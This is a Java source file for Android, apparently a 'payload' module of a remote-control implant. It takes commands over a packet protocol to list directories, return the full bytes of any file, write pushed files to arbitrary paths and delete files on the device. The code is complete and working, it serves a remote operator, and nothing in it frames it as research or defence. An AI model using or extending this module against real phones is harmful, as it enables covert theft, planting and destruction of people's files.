package com.core.payloads;

import android.app.Activity;
import android.os.Environment;
import com.corelib.IPayload;
import com.corelib.Packet;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

/**
 * Sys class
 * Created by hkff on 4/28/15.
 */
public class Files implements IPayload {

    //-----------------------------------------------------------//
    public enum Commands {
        LS,
        GETFILE,
        PUSHFILE,
        RM,
    }

    @Override
    public String man() {
        return "";
    }

    /***
     * Handle msg
     * @param msg
     * @return
     */
    @Override
    public Packet handle(Packet msg) {
        // The result to return
        Packet result = new Packet("NO_COMMAND_PROVIDED", Packet.Type.STRING);

        // Get the command (and convert it to uppercase)
        String cmd0 = msg.getMsg().toUpperCase();

        // Check if the command exists in our Commands enumeration
        Commands cmd;
        try{
            cmd = Commands.valueOf(cmd0);
        } catch (IllegalArgumentException e){
            // If there is no command, we return an error message
            result.setType(Packet.Type.NONE);
            return result;
        }

        // Parse args
        String[] tmp;

        // We handle the command
        switch (cmd){
            // List directory content
            // Protocol : LISTDIR
            case LS:
                tmp = new String(msg.getContent()).split(":");
                // Get args
                String path = (tmp.length > 0)? tmp[0] : "";
                result.setMsg(this.listDir(path));
                break;

            // Remove a file/dir
            // Protocol : RM:path
            case RM:
                tmp = new String(msg.getContent()).split(":");
                // Get args
                String fpath = (tmp.length > 0)? tmp[0] : "";
                result.setMsg(Files.removeFile(fpath));
                break;

            // Download a file
            // Protocol : GETFILE:file_path
            case GETFILE:
                // Get args
                tmp = new String(msg.getContent()).split(":");
                String file_path = (tmp.length > 0)? tmp[0] : "";
                File f = Files.getFile(file_path);
                if(f != null) {
                    result.setType(Packet.Type.FILE);
                    result.setMsg(f.getName());
                    result.setContent(Files.fileToBytes(f));
                }else
                    result.setMsg("File not found !");

                break;

            // Push a file into mobile
            // Protocol : PUSHFILE:file_path
            case PUSHFILE:
                // Get args
                String ofile_path = (msg.getExtras().size() > 0)?msg.getExtras().get(0):
                        Environment.getExternalStorageState().concat("tmp");
                // Write the file
                result.setMsg(Files.writeFile(msg.getContent(), ofile_path));
                break;
        }

        return result;
    }
    //-----------------------------------------------------------//


    // Attributes
    public Activity app;

    @Override
    public void setApp(Activity app) {
        this.app = app;
    }

    public Files(){}

    /**
     * Constructor
     * @param app
     */
    public Files(Activity app){
        this.app = app;
    }


    /**
     * List directory content
     * @param path
     * @return
     */
    public static synchronized String listDir(String path) {
        String result = "";
        try{
            File root = (path.isEmpty())?Environment.getExternalStorageDirectory(): new File(path);

            File[] children = root.listFiles();
            result += root.getName();
            for(File node: children) {
                result += "\n  " + node.getName();
            }
        } catch (Exception e){
            e.printStackTrace();
        }
        return result;
    }

    /**
     * Convert file to byte[]
     * @param file
     * @return
     */
    public static synchronized byte[] fileToBytes(File file) {
        byte[] result = null;
        try{
            result = new byte[(int) file.length()];
            //convert file into array of bytes
            FileInputStream fileInputStream = new FileInputStream(file);
            fileInputStream.read(result);
            fileInputStream.close();

        } catch (Exception e){
            e.printStackTrace();
        }
        return result;
    }

    /**
     * Get a file
     * @param path
     * @return
     */
    public static synchronized File getFile(String path) {
        File result = null;
        try{
            result = new File(path);
        } catch (Exception e){
            e.printStackTrace();
        }
        return result;
    }


    /**
     * Write byte[] to a file
     * @param file
     * @param path
     * @return
     */
    public static synchronized String writeFile(byte[] file, String path) {
        String result = "File written !";
        try{
            FileOutputStream fos = new FileOutputStream(path);
            fos.write(file);
            fos.close();
        } catch(Exception e) {
            e.printStackTrace();
            result = e.getMessage();
        }
        return result;
    }

    /**
     * Remove a file
     * @param path
     * @return
     */
    public static synchronized String removeFile(String path) {
        String result = "File removed !";
        try{
            File p = new File(path);
            p.delete();
        } catch (Exception e){
            e.printStackTrace();
            result = e.getMessage();
        }
        return result;
    }
}
